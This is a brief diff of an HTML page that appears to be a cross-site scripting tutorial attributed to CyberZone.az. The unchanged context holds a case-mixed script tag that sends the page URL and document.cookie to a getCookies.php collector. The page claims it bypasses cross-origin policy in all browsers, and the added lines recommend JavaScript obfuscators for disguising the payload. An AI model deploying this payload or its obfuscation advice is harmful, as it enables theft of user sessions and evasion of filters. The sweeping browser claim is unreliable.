@@ -13,5 +13,8 @@
     <sCRiPt>new Image().src="https://localhost/getCookies.php?u="+document.location.href+"&c="+document.cookie;</sCRiPt>
 
 <p>These examples in above is written for bypassing cross site origin policy in all browsers but you can use your own payload instead.</p>
+<p>For encrypting your payload:</p>
+<a href="https://obfuscator.io/">obfuscator.io</a>
+<a href="http://www.jsfuck.com/">jsfuck.com</a>
 
-From: Cyberzone.az
+From: <a href="https://cyberzone.az/">CyberZone.az</a>
